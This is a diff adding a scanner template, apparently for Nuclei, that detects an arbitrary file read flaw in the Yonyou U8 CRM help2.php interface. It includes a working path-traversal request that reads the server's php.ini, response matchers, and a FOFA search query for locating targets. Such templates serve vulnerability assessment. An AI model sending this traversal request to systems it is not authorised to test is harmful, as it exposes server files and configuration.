@@ -1,0 +1,30 @@
+id: yongyou-u8-crm-help2-fileread
+
+info:
+  name: 用友U8 CRM系统help2 任意文件读取漏洞
+  author: wutalent
+  severity: high
+  description: |
+    用友U8+经过20多年的市场锤炼，不断贴近客户需求，以全新UAP为平台，应对中型及成长型企业客户群的发展，提供的是一整套企业级数智化升级解决方案，为成长型企业构建精细管理、产业链协同、社交化运营为一体的企业互联网经营管理平台，助力企业应势而变。该系统help2文件中接口存在任意文件读取漏洞。
+  metadata:
+    fofa-query: title="用友U8CRM"
+  tags: u8,yongyou,fileread
+
+http:
+  - raw:
+      - |+
+        GET /pub/help2.php?key=/../../apache/php.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "[PHP]"
+          - "About php.ini"
+          - "无效的授权说明"
+        condition: and
+      - type: status
+        status:
+          - 200
